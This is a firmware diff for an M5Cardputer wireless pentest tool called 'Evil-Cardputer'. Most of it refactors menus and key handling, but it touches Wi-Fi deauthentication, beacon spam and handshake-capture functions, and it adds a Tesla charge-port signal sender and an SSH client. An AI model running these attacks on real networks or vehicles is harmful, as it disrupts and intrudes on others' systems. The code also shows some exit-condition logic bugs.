   const unsigned long debounceDelay = 200; // Temps en millisecondes pour ignorer les pressions supplémentaires
-  // Attendre que la touche KEY_ENTER soit relâchée avant de continuer
-  while (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
-    M5.update();
-    M5Cardputer.update();
-    delay(10); // Petit délai pour réduire la charge du processeur
-  }
+  enterDebounce();
   while (true) {
     M5.update();
     M5Cardputer.update();
@@ -3172,6 +3433,10 @@ void listProbes() {
         Serial.println("SSID selected: " + probes[currentListIndex]);
         waitAndReturnToMenu(probes[currentListIndex] + " selected");
         return; // Sortie de la fonction après sélection
+      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+        inMenu = true;
+        drawMenu();
+        break;
       }
 
       if (!M5Cardputer.Keyboard.isKeyPressed(';') && !M5Cardputer.Keyboard.isKeyPressed('.') && !M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
@@ -3248,12 +3513,7 @@ void deleteProbe() {
 
   unsigned long lastKeyPressTime = 0;
   const unsigned long debounceDelay = 200; // Temps en millisecondes pour ignorer les pressions supplémentaires
-  // Attendre que la touche KEY_ENTER soit relâchée avant de continuer
-  while (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
-    M5.update();
-    M5Cardputer.update();
-    delay(10); // Petit délai pour réduire la charge du processeur
-  }
+  enterDebounce();
   while (true) {
     M5.update();
     M5Cardputer.update();
@@ -3285,9 +3545,10 @@ void deleteProbe() {
           waitAndReturnToMenu("Return to menu");
           return;
         }
-      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE) && !keyHandled) {
-        waitAndReturnToMenu("Return to menu");
-        return;
+      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+        inMenu = true;
+        drawMenu();
+        break;
       }
 
       if (!M5Cardputer.Keyboard.isKeyPressed(';') && !M5Cardputer.Keyboard.isKeyPressed('.') && !M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
@@ -3347,6 +3608,10 @@ int showProbesAndSelect(String probes[], int numProbes) {
         selectedIndex = currentListIndex;
         keyHandled = true;
         lastKeyPressTime = millis();
+      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+        inMenu = true;
+        drawMenu();
+        break;
       }
 
       if (!M5Cardputer.Keyboard.isKeyPressed(';') && !M5Cardputer.Keyboard.isKeyPressed('.') && !M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
@@ -3994,9 +4259,9 @@ void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPD
 
 String createPreHeader() {
   String preHeader = "WigleWifi-1.4";
-  preHeader += ",appRelease=v1.2.2"; // Remplacez [version] par la version de votre application
+  preHeader += ",appRelease=v1.2.6"; // Remplacez [version] par la version de votre application
   preHeader += ",model=Cardputer";
-  preHeader += ",release=v1.2.2"; // Remplacez [release] par la version de l'OS de l'appareil
+  preHeader += ",release=v1.2.6"; // Remplacez [release] par la version de l'OS de l'appareil
   preHeader += ",device=Evil-Cardputer"; // Remplacez [device name] par un nom de périphérique, si souhaité
   preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractéristiques d'affichage, si pertinent
   preHeader += ",board=M5Cardputer";
@@ -4012,8 +4277,8 @@ int nearPrevousWifi = 0;
 double lat = 0.0, lng = 0.0, alt = 0.0; // Déclaration des variables pour la latitude, la longitude et l'altitude
 float accuracy = 0.0; // Déclaration de la variable pour la précision
 
-void wardrivingMode() {
 
+void wardrivingMode() {
   WiFi.mode(WIFI_STA);
   WiFi.disconnect();
   Serial.println("-------------------");
@@ -4085,16 +4350,16 @@ void wardrivingMode() {
           M5.Lcd.setCursor(0, 60);
           M5.Lcd.print("Sattelites:" + String(gps.satellites.value()));
           M5.Lcd.println("  ");
-          
+
           // Altitude
           M5.Lcd.setCursor(0, 75);
           M5.Lcd.print("Altitude:");
           M5.Lcd.print(String(gps.altitude.meters(), 2) + "m");
           M5.Lcd.println("  ");
-          
+
           // Date et Heure
           String dateTime = formatTimeFromGPS();
-          M5.Lcd.setCursor(0, 90); 
+          M5.Lcd.setCursor(0, 90);
           M5.Lcd.print("Time:");
           M5.Lcd.print(dateTime);
           M5.Lcd.println("  ");
@@ -4152,7 +4417,7 @@ void wardrivingMode() {
       M5.Lcd.printf("Near WiFi: %d\n", n);
     }
 
-    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE) ) {
       exitWardriving = true;
       delay(1000);
       M5.Display.setTextSize(1.5);
@@ -4373,7 +4638,7 @@ void beaconAttack() {
   Serial.println("Starting Beacon Spam");
   Serial.println("-------------------");
 
-  while (!M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+  while (!M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || !M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE) ) {
     unsigned long currentMillis = millis();
     if (currentMillis - previousMillis >= delayTimeBeacon) {
       previousMillis = currentMillis;
@@ -4433,12 +4698,7 @@ void setWifiSSID() {
   M5.Display.println("Enter SSID:"); // Entête ou instruction
   M5.Display.setCursor(0, 30); // Définissez la position pour afficher le SSID
   String nameSSID = ""; // Initialisez la chaîne de données pour stocker le SSID entré
-  // Attendre que la touche KEY_ENTER soit relâchée avant de continuer
-  while (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
-    M5.update();
-    M5Cardputer.update();
-    delay(10); // Petit délai pour réduire la charge du processeur
-  }
+  enterDebounce();
   while (true) {
     M5Cardputer.update();
     if (M5Cardputer.Keyboard.isChange()) {
@@ -4502,11 +4762,7 @@ void setWifiPassword() {
   M5.Display.setTextSize(1); // Définissez la taille du texte pour l'affichage
   M5.Display.println("Should be greater than 8 or egal 0"); // Entête ou instruction
   M5.Display.setTextSize(1.5); // Définissez la taille du texte pour l'affichage
-  while (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
-    M5.update();
-    M5Cardputer.update();
-    delay(10); // Petit délai pour réduire la charge du processeur
-  }
+  enterDebounce();
   while (true) {
     M5Cardputer.update();
     if (M5Cardputer.Keyboard.isChange()) {
@@ -4785,11 +5041,7 @@ void deauthDetect() {
     Serial.println("Fail to create /handshakes folder");
     return;
   }
-  while (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
-    M5.update();
-    M5Cardputer.update();
-    delay(10); // Petit délai pour réduire la charge du processeur
-  }
+  enterDebounce();
   while (!btnBPressed) {
     esp_task_wdt_reset();
     vTaskDelay(pdMS_TO_TICKS(10));
@@ -5164,11 +5416,7 @@ void deauthAttack(int networkIndex) {
   Serial.println("-------------------");
   Serial.println("Starting Deauth Attack");
   Serial.println("-------------------");
-  while (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
-    M5.update();
-    M5Cardputer.update();
-    delay(10); // Petit délai pour réduire la charge du processeur
-  }
+  enterDebounce();
   while (true) {
     unsigned long currentMillis = millis();
 
@@ -5202,6 +5450,10 @@ void deauthAttack(int networkIndex) {
     }
     if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && currentMillis - lastDebounceTime > debounceDelay) {
       break; // Stop the attack
+    } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+      inMenu = true;
+      drawMenu();
+      break;
     }
   }
   Serial.println("-------------------");
@@ -5231,12 +5483,12 @@ void sendDeauthPacket() {
   // Envoyer le paquet modifié
   esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
 
-  // Affichage du contenu du paquet pour le débogage
-  Serial.println("Deauthentication Frame:");
-  for (int i = 0; i < sizeof(deauth_frame); i++) {
+  /*// Affichage du contenu du paquet pour le débogage
+    Serial.println("Deauthentication Frame:");
+    for (int i = 0; i < sizeof(deauth_frame); i++) {
     Serial.print(deauth_frame[i], HEX);
     Serial.print(" ");
-  }
+    }*/
   Serial.println();
 }
 //deauther end
@@ -5653,14 +5905,16 @@ void deauthClients() {
   } else {
     M5.Lcd.print("0");
   }
-  while (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
-    M5.update();
-    M5Cardputer.update();
-    delay(10); // Petit délai pour réduire la charge du processeur
-  }
+  enterDebounce();
 
   unsigned long lastKeyPressTime = 0;
   const unsigned long debounceDelay = 1000;
+
+  unsigned long lastScanTime = millis();
+  unsigned long lastChannelChange = millis();
+  unsigned long lastClientPurge = millis();
+  unsigned long lastTimeUpdate = millis();
+  unsigned long lastPrintTime = millis();
 
   while (true) {
     esp_task_wdt_reset();
@@ -5669,7 +5923,27 @@ void deauthClients() {
     M5Cardputer.update();
 
     unsigned long currentPressTime = millis();
+    unsigned long currentTimeAuto = millis();
 
+    if (currentTimeAuto - lastTimeUpdate >= 2000) {
+      unsigned long timeToNextScan = scanInterval - (currentTimeAuto - lastScanTime);
+      unsigned long timeToNextPurge = clientPurgeInterval - (currentTimeAuto - lastClientPurge);
+      unsigned long timeToNextChannelChange = channelChangeInterval - (currentTimeAuto - lastChannelChange);
+      Serial.println("-----------------");
+      Serial.print("Time to next scan: ");
+      Serial.print(timeToNextScan / 1000);
+      Serial.println(" seconds");
+
+      Serial.print("Time to next purge: ");
+      Serial.print(timeToNextPurge / 1000);
+      Serial.println(" seconds");
+
+      Serial.print("Time to next channel change: ");
+      Serial.print(timeToNextChannelChange / 1000);
+      Serial.println(" seconds");
+      Serial.println("-----------------");
+      lastTimeUpdate = currentTimeAuto;
+    }
     if (M5Cardputer.Keyboard.isKeyPressed('d') && (currentPressTime - lastKeyPressTime > debounceDelay)) {
       isDeauthActive = !isDeauthActive;
       Serial.println(isDeauthActive ? "Deauther activated !" : "Deauther disabled !");
@@ -5678,7 +5952,7 @@ void deauthClients() {
       lastKeyPressTime = currentPressTime;
     }
 
-    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && (currentPressTime - lastKeyPressTime > debounceDelay)) {
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE) && (currentPressTime - lastKeyPressTime > debounceDelay)) {
       esp_wifi_set_promiscuous(false);
       esp_wifi_set_promiscuous_rx_cb(NULL);
       break;
@@ -5708,8 +5982,6 @@ void deauthClients() {
       }
       lastKeyPressTime = currentPressTime;
     }
-
-    unsigned long currentTimeAuto = millis();
 
     // Lancement d'un scan et deauthbroadcast toutes les 60 secondes
     if (currentTimeAuto - lastScanTime >= scanInterval) {
@@ -5757,11 +6029,7 @@ int currentListIndexPcap = 0;
 void checkHandshakes() {
   loadPcapFiles();
   displayPcapList();
-  while (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
-    M5.update();
-    M5Cardputer.update();
-    delay(10); // Petit délai pour réduire la charge du processeur
-  }
+  enterDebounce();
 
   unsigned long lastKeyPressTime = 0;  // Temps de la dernière pression de touche
   const unsigned long debounceDelay = 250;  // Delai de debounce en millisecondes
@@ -5782,6 +6050,10 @@ void checkHandshakes() {
     if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && (currentPressTime - lastKeyPressTime > debounceDelay)) {
       waitAndReturnToMenu("return to menu");
       return;
+    } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+      inMenu = true;
+      drawMenu();
+      break;
     }
   }
 }
@@ -5989,16 +6261,12 @@ void wallOfFlipper() {
 
   initializeBLEIfNeeded();
   delay(200);
-  while (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
-    M5.update();
-    M5Cardputer.update();
-    delay(10); // Petit délai pour réduire la charge du processeur
-  }
+  enterDebounce();
   while (true) {
     M5.update(); // Mettre à jour l'état des boutons
     M5Cardputer.update();
     // Gestion du bouton B pour basculer entre le mode auto et statique
-    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
       waitAndReturnToMenu("Stop detection...");
       return;
     }
@@ -6019,3 +6287,1236 @@ void wallOfFlipper() {
   waitAndReturnToMenu("Stop detection...");
 }
 // Wof part end
+
+
+//Send Tesla code
+void sendTeslaCode() {
+  M5Cardputer.Lcd.setTextSize(1.5);
+  pinMode(signalPin, OUTPUT);
+  digitalWrite(signalPin, LOW);
+
+  M5.Lcd.setTextSize(1.5);
+  M5.Lcd.fillRect(0, 0, 320, 240, TFT_BLACK);
+  M5.Lcd.fillRect(0, 0, 320, 20, M5.Lcd.color565(38, 38, 38));
+  M5.Lcd.setTextColor(TFT_WHITE);
+  M5.Lcd.drawString("Tesla Code Sender", 30, 1, 2);
+  M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK);
+
+  M5.Lcd.setCursor(5, M5.Display.height() / 2);
+  M5.Lcd.print("Press Enter to send data");
+  enterDebounce();
+  while (true) {
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
+      Serial.println("SEND");
+      M5Cardputer.Lcd.setCursor(10, M5.Display.height() / 2 + 30);
+      M5Cardputer.Lcd.print("Sending Tesla Code ...");
+      sendSignals();
+      M5Cardputer.Lcd.setCursor(10, M5.Display.height() / 2 + 30);
+      M5Cardputer.Lcd.print("                      ");
+    }
+    if ( M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+      waitAndReturnToMenu("Return to menu...");
+      return;
+    }
+    delay(10);
+    M5Cardputer.update();
+  }
+}
+
+void sendSignals() {
+  for (uint8_t t = 0; t < transmissions; t++) {
+    for (uint8_t i = 0; i < messageLength; i++) {
+      sendByte(sequence[i]);
+    }
+    digitalWrite(signalPin, LOW);
+    delay(messageDistance);
+  }
+}
+
+void sendByte(uint8_t dataByte) {
+  for (int8_t bit = 7; bit >= 0; bit--) { // MSB
+    digitalWrite(signalPin, (dataByte & (1 << bit)) != 0 ? HIGH : LOW);
+    delayMicroseconds(pulseWidth);
+  }
+}
+
+
+//Send Tesla code end
+
+
+// Fonction pour se connecter au Wi-Fi
+bool connectToWiFi(const String& ssid, const String& password) {
+  WiFi.begin(ssid.c_str(), password.c_str());
+
+  M5.Display.clear();
+  M5.Display.setCursor(0, 10);
+  M5.Display.println("Connecting to WiFi...");
+  M5.Display.display();
+
+  Serial.print("Connecting to SSID: ");
+  Serial.println(ssid);
+
+  int timeout = 10; // Timeout de 10 secondes pour la connexion
+  while (WiFi.status() != WL_CONNECTED && timeout > 0) {
+    delay(1000);
+    timeout--;
+    Serial.print(".");
+  }
+  Serial.println();
+
+  if (WiFi.status() == WL_CONNECTED) {
+    Serial.println("WiFi connected successfully!");
+    M5.Display.clear();
+    M5.Display.setCursor(0, 10);
+    M5.Display.println("Connected!");
+    M5.Display.setCursor(0, 30);
+    M5.Display.println("IP: " + WiFi.localIP().toString());
+    M5.Display.display();
+    delay(2000); // Affiche le message pendant 2 secondes
+    return true;
+  } else {
+    Serial.println("Failed to connect to WiFi.");
+    M5.Display.clear();
+    M5.Display.setCursor(0, 10);
+    M5.Display.println("Failed to connect.");
+    M5.Display.setCursor(0, 30);
+    M5.Display.println("Please try again.");
+    M5.Display.display();
+    delay(2000); // Affiche le message pendant 2 secondes
+    return false;
+  }
+}
+
+// Fonction principale de connexion Wi-Fi
+void connectWifi(int networkIndex) {
+  Serial.println("Starting WiFi connection process...");
+
+  if (WiFi.localIP().toString() != "0.0.0.0") {
+    if (confirmPopup("You want to disconnect ?")) {
+      Serial.println("Disconnecting from current WiFi...");
+      WiFi.disconnect(true);
+      waitAndReturnToMenu("Disconnected");
+      return;
+    } else {
+      waitAndReturnToMenu("Stay connected...");
+      return;
+    }
+  }
+
+  String nameSSID = ssidList[networkIndex];
+  String password = "";
+
+  Serial.print("Selected network SSID: ");
+  Serial.println(nameSSID);
+
+  // Si le réseau est ouvert, passer directement à la connexion
+  if (getWifiSecurity(networkIndex) == "Open") {
+    Serial.println("Network is open, no password required.");
+    if (connectToWiFi(nameSSID, "")) {
+      waitAndReturnToMenu("Connected to WiFi: " + nameSSID);
+    } else {
+      waitAndReturnToMenu("Failed to connect to WiFi: " + nameSSID);
+    }
+    return;
+  }
+
+  // Demander le mot de passe pour les réseaux sécurisés
+  M5.Display.clear();
+  M5.Display.setCursor(0, 10);
+  M5.Display.println("Enter Password for " + nameSSID + " :");
+  M5.Display.setCursor(0, 30);
+  M5.Display.display();
+  enterDebounce();
+  while (true) {
+    M5Cardputer.update();
+    if (M5Cardputer.Keyboard.isChange()) {
+      if (M5Cardputer.Keyboard.isPressed()) {
+        Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
+
+        for (auto i : status.word) {
+          password += i;
+        }
+
+        if (status.del && password.length() > 0) {
+          password.remove(password.length() - 1);
+        }
+
+        M5.Display.clear();
+        M5.Display.setCursor(0, 10);
+        M5.Display.println("Password for " + nameSSID + " :");
+        M5.Display.setCursor(0, 30);
+        M5.Display.println(password); // Affichez le mot de passe en clair
+        M5.Display.display();
+
+        if (status.enter) {
+          Serial.print("Attempting to connect to WiFi with password: ");
+          Serial.println(password);
+
+          if (connectToWiFi(nameSSID, password)) {
+            waitAndReturnToMenu("Connected to WiFi: " + nameSSID);
+          } else {
+            waitAndReturnToMenu("Failed to connect to WiFi: " + nameSSID);
+          }
+          break;
+        }
+      }
+      delay(200);
+    }
+  }
+}
+
+// connect to SSH
+
+//from https://github.com/fernandofatech/M5Cardputer-SSHClient and refactored 
+bool sshKilled = false;
+void testConnectivity(const char *host) {
+  M5.Display.clear();
+  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
+  M5.Display.setCursor(0, 10);
+  Serial.println("Pinging Host...");
+  M5.Display.print("Pinging: " + String(host));
+  if (Ping.ping(host)) {
+    M5.Display.setCursor(0, 10);
+    Serial.println("Ping successfull");
+    M5.Display.println("Ping successfull                            ");
+  } else {
+    M5.Display.setCursor(0, 10);
+    M5.Display.println("Ping Failed                                 ");
+    Serial.println("Ping failed");
+  }
+}
+
+ssh_session connect_ssh(const char *host, const char *user, int port) {
+  ssh_session session = ssh_new();
+  if (session == NULL) {
+    Serial.println("Failed to create SSH session");
+    return NULL;
+  }
+
+  ssh_options_set(session, SSH_OPTIONS_HOST, host);
+  ssh_options_set(session, SSH_OPTIONS_USER, user);
+  ssh_options_set(session, SSH_OPTIONS_PORT, &port);
+
+  if (ssh_connect(session) != SSH_OK) {
+    Serial.print("Error connecting to host");
+    M5.Display.setCursor(0, 10);
+    M5.Display.print("Error connecting to host");
+    Serial.println(ssh_get_error(session));
+    ssh_free(session);
+    return NULL;
+  }
+
+  return session;
+}
+
+int authenticate_console(ssh_session session, const char *password) {
+  int rc = ssh_userauth_password(session, NULL, password);
+  if (rc != SSH_AUTH_SUCCESS) {
+    Serial.print("Password error authenticating");
+    M5.Display.setCursor(0, 10);
+    M5.Display.print("Password error authenticating");
+    Serial.println(ssh_get_error(session));
+    return rc;
+  }
+  return SSH_OK;
+}
+
+void sshConnectTask(void *pvParameters) {
+  testConnectivity(ssh_host.c_str()); // Test de connectivité
+
+  my_ssh_session = connect_ssh(ssh_host.c_str(), ssh_user.c_str(), ssh_port);
+  if (my_ssh_session == NULL) {
+    Serial.println("SSH Connection failed.");
+    M5.Display.setCursor(0, 10);
+    M5.Display.print("SSH Connection failed.");
+    vTaskDelete(NULL);
+    return;
+  }
+
+  if (authenticate_console(my_ssh_session, ssh_password.c_str()) != SSH_OK) {
+    Serial.println("SSH Authentication failed.");
+    M5.Display.setCursor(0, 10);
+    M5.Display.print("SSH Authentication failed.");
+    ssh_disconnect(my_ssh_session);
+    ssh_free(my_ssh_session);
+    vTaskDelete(NULL);
+    sshKilled = true;
+    return;
+  }
+
+  my_channel = ssh_channel_new(my_ssh_session);
+  if (my_channel == NULL || ssh_channel_open_session(my_channel) != SSH_OK) {
+    Serial.println("SSH Channel open error.");
+    M5.Display.setCursor(0, 10);
+    M5.Display.print("SSH Channel open error.");
+    ssh_disconnect(my_ssh_session);
+    ssh_free(my_ssh_session);
+    vTaskDelete(NULL);
+    sshKilled = true;
+    return;
+  }
+
+  if (ssh_channel_request_pty(my_channel) != SSH_OK || ssh_channel_request_shell(my_channel) != SSH_OK) {
+    Serial.println("Request PTY/Shell failed.");
+    M5.Display.setCursor(0, 10);
+    M5.Display.print("Request PTY/Shell failed.");
+    ssh_channel_close(my_channel);
+    ssh_channel_free(my_channel);
+    ssh_disconnect(my_ssh_session);
+    ssh_free(my_ssh_session);
+    vTaskDelete(NULL);
+    sshKilled = true;
+    return;
+  }
+
+  M5.Display.clear();
+  M5.Display.setCursor(0, 10);
+  M5.Display.println("SSH Connection established.");
+  M5.Display.display();
+
+  xTaskCreatePinnedToCore(sshTask, "SSH Task", 40000, NULL, 1, NULL, 1);
+  vTaskDelete(NULL);
+}
+
+String getUserInput(bool isPassword = false) {
+  String input = "";
+  M5.Display.setTextSize(1.5);
+  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
+  M5.Display.setCursor(0, 30);
+  while (true) {
+    M5Cardputer.update();
+    if (M5Cardputer.Keyboard.isChange()) {
+      if (M5Cardputer.Keyboard.isPressed()) {
+        Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
+
+        for (auto i : status.word) {
+          input += i;
+        }
+
+        if (status.del && input.length() > 0) {
+          input.remove(input.length() - 1);
+          M5.Display.setCursor(0, 30);
+          M5.Display.print("                                          ");
+        }
+
+        if (status.enter && input.length() > 0) {
+          return input;
+        }
+
+        M5.Display.setCursor(0, 30);
+        M5.Display.print(input);
+        M5.Display.display();
+      }
+    }
+    delay(200); // Petit délai pour réduire la charge du processeur
+  }
+}
+
+void parseUserHostPort(const String &input, String &user, String &host, int &port) {
+  int atIndex = input.indexOf('@');
+  int colonIndex = input.indexOf(':');
+  if (atIndex != -1 && colonIndex != -1) {
+    user = input.substring(0, atIndex);
+    host = input.substring(atIndex + 1, colonIndex);
+    port = input.substring(colonIndex + 1).toInt();
+  }
+}
+
+
+// Fonction principale pour se connecter via SSH
+void sshConnect(const char *host) {
+  sshKilled = false;
+  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
+  if (WiFi.localIP().toString() == "0.0.0.0") {
+    waitAndReturnToMenu("Not connected...");
+    return;
+  }
+
+  if (host == nullptr) {
+    // Demander à l'utilisateur s'il souhaite utiliser les informations stockées si elles ne sont pas vides
+    if (ssh_user != "" && ssh_host != "" && ssh_password != "") {
+      if (confirmPopup("Use stored SSH details?")) {
+        // Utiliser les informations stockées
+        Serial.print("Using stored SSH details: ");
+        Serial.println("User: " + ssh_user + ", Host: " + ssh_host + ", Port: " + String(ssh_port));
+      } else {
+        // Demander de nouvelles informations
+        ssh_user = "";
+        ssh_host = "";
+        ssh_password = "";
+      }
+    }
+
+    if (ssh_user == "" || ssh_host == "" || ssh_password == "") {
+      M5.Display.clear();
+      M5.Display.setCursor(0, 10);
+      M5.Display.println("Enter SSH User@Host:Port:");
+      String userHostPort = getUserInput();
+      parseUserHostPort(userHostPort, ssh_user, ssh_host, ssh_port);
+    }
+  } else {
+    ssh_host = host;
+    ssh_password = "";
+    M5.Display.clear();
+    M5.Display.setCursor(0, 10);
+    M5.Display.println("Enter SSH User:");
+    ssh_user = getUserInput();
+
+    M5.Display.clear();
+    M5.Display.setCursor(0, 10);
+    M5.Display.println("Enter SSH Port:");
+    String portStr = getUserInput();
+    ssh_port = portStr.toInt();
+  }
+  if (ssh_password == "") {
+    M5.Display.clear();
+    M5.Display.setCursor(0, 10);
+    M5.Display.println("Enter SSH Password:");
+    ssh_password = getUserInput();
+  }
+  if (ssh_user.length() == 0 || ssh_host.length() == 0 || ssh_password.length() == 0) {
+    waitAndReturnToMenu("Invalid input.");
+    return;
+  }
+
+  Serial.print("SSH User: ");
+  Serial.println(ssh_user);
+  Serial.print("SSH Host: ");
+  Serial.println(ssh_host);
+  Serial.print("SSH Port: ");
+  Serial.println(ssh_port);
+
+  TaskHandle_t sshConnectTaskHandle = NULL;
+  xTaskCreatePinnedToCore(sshConnectTask, "SSH Connect Task", 40000, NULL, 1, &sshConnectTaskHandle, 1);
+  if (sshConnectTaskHandle == NULL) {
+    Serial.println("Failed to create SSH Connect Task");
+  } else {
+    while (true) {
+      if (sshKilled) {
+        delay(1000);
+        break;
+      }
+      delay(100);
+    }
+  }
+  waitAndReturnToMenu("Back to menu");
+}
+
+// Convert String to std::string
+std::string StringToStdString(const String &input) {
+  return std::string(input.c_str());
+}
+
+// Convert std::string to String
+String StdStringToString(const std::string &input) {
+  return String(input.c_str());
+}
+
+// Function to remove ANSI escape codes
+String removeANSIEscapeCodes(const String &input) {
+  std::string output = StringToStdString(input);
+
+  // Regex for ANSI escape codes
+  std::regex ansi_regex(R"(\x1B\[[0-?]*[ -/]*[@-~])");
+  output = std::regex_replace(output, ansi_regex, "");
+
+  // Remove other escape codes
+  std::regex other_escape_codes(R"(\x1B\]0;.*?\x07|\x1B\[\?1[hl]|\x1B\[\?2004[hl]|\x1B=|\x1B>|(\x07)|(\x08)|(\x1B\(B))");
+  output = std::regex_replace(output, other_escape_codes, "");
+
+  // Remove non-printable characters except space
+  output.erase(std::remove_if(output.begin(), output.end(), [](unsigned char c) {
+    return !std::isprint(c) && !std::isspace(c);
+  }), output.end());
+
+  return StdStringToString(output);
+}
+
+String trimString(const String &str) {
+  int start = 0;
+  while (start < str.length() && isspace(str[start])) {
+    start++;
+  }
+
+  int end = str.length() - 1;
+  while (end >= 0 && isspace(str[end])) {
+    end--;
+  }
+
+  return str.substring(start, end + 1);
+}
+
+void sshTask(void *pvParameters) {
+  ssh_channel channel = my_channel;
+  if (channel == NULL) {
+    M5Cardputer.Display.println("SSH Channel not open.");
+    vTaskDelete(NULL);
+    return;
+  }
+
+  String commandBuffer = "> ";
+  String currentCommand = "";
+  int cursorX = 0;
+  int cursorY = 0;
+  const int lineHeight = 16;
+  unsigned long lastKeyPressMillis = 0;
+  const unsigned long debounceDelay = 200;
+
+  int displayHeight = M5Cardputer.Display.height();
+  int displayWidth = M5Cardputer.Display.width();
+  int totalLines = displayHeight / lineHeight;
+  int currentLine = 0;
+
+  M5Cardputer.Display.clear();
+  M5Cardputer.Display.setTextSize(1);
+  M5Cardputer.Display.setCursor(cursorX, cursorY);
+  M5Cardputer.Display.print(commandBuffer);
+  M5Cardputer.Display.display();
+
+  while (true) {
+    M5Cardputer.update();
+
+    if (M5Cardputer.Keyboard.isChange()) {
+      if (M5Cardputer.Keyboard.isPressed()) {
+        unsigned long currentMillis = millis();
+        if (currentMillis - lastKeyPressMillis >= debounceDelay) {
+          Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
+
+          // Check for esc key press
+          if (M5Cardputer.Keyboard.isKeyPressed('`')) {
+            Serial.println("esc pressed, closing SSH session and returning to menu");
+            // Close SSH session and return to menu
+            sshKilled = true;
+            break;
+          }
+
+          // Check for CTRL+C
+          if (M5Cardputer.Keyboard.isKeyPressed(KEY_LEFT_CTRL) && M5Cardputer.Keyboard.isKeyPressed('C')) {
+            Serial.println("CTRL+C pressed, sending interrupt signal to SSH session");
+            ssh_channel_write(channel, "\x03", 1); // Send CTRL+C
+          }
+          // Check for TAB // not working properlly
+          else if (M5Cardputer.Keyboard.isKeyPressed(KEY_TAB)) {
+            Serial.println("TAB pressed, requesting completion from SSH session");
+            String completionCommand = currentCommand + '\t'; // Append TAB character for completion
+            Serial.print("Command sent: ");
+            Serial.println(completionCommand);
+            ssh_channel_write(channel, completionCommand.c_str(), completionCommand.length());
+
+            // Read the completion response from the server
+            char completionBuffer[1024];
+            int completionBytes = ssh_channel_read_nonblocking(channel, completionBuffer, sizeof(completionBuffer), 0);
+            if (completionBytes > 0) {
+              String completionResponse = "";
+              for (int i = 0; i < completionBytes; ++i) {
+                completionResponse += completionBuffer[i];
+              }
+
+              completionResponse = removeANSIEscapeCodes(completionResponse);
+
+              // Clear the current command and buffer
+              commandBuffer = "> ";
+              currentCommand = "";
+
+              // Update the command buffer with the completion response
+              currentCommand = trimString(completionResponse);
+              commandBuffer += currentCommand;
+
+              // Clear the display and update with new command
+              M5Cardputer.Display.clear();
+              cursorX = 0;
+              cursorY = 0;
+              currentLine = 0;
+              M5Cardputer.Display.setCursor(cursorX, cursorY);
+              M5Cardputer.Display.print(commandBuffer);
+              M5Cardputer.Display.display();
+            }
+          }
+          else {
+            for (auto i : status.word) {
+              commandBuffer += i;
+              currentCommand += i;
+              M5Cardputer.Display.print(i);
+              cursorX = M5Cardputer.Display.getCursorX();
+              if (cursorX >= displayWidth) {
+                cursorX = 0;
+                cursorY += lineHeight;
+                currentLine++;
+                if (currentLine >= totalLines) {
+                  M5Cardputer.Display.scroll(0, -lineHeight);
+                  cursorY = displayHeight - lineHeight;
+                  currentLine = totalLines - 1;
+                }
+                M5Cardputer.Display.setCursor(cursorX, cursorY);
+              }
+            }
+
+            if (status.del && commandBuffer.length() > 2) {
+              commandBuffer.remove(commandBuffer.length() - 1);
+              currentCommand.remove(currentCommand.length() - 1);
+              cursorX -= 6;
+              if (cursorX < 0) {
+                cursorX = displayWidth - 6;
+                cursorY -= lineHeight;
+                currentLine--;
+                if (currentLine < 0) {
+                  currentLine = 0;
+                  cursorY = 0;
+                }
+              }
+              M5Cardputer.Display.setCursor(cursorX, cursorY);
+              M5Cardputer.Display.print(" ");
+              M5Cardputer.Display.setCursor(cursorX, cursorY);
+            }
+
+            if (status.enter) {
+              String message = currentCommand + "\r";
+              Serial.print("Command sent: ");
+              Serial.println(message);
+              ssh_channel_write(channel, message.c_str(), message.length());
+
+              commandBuffer = "> ";
+              currentCommand = "";
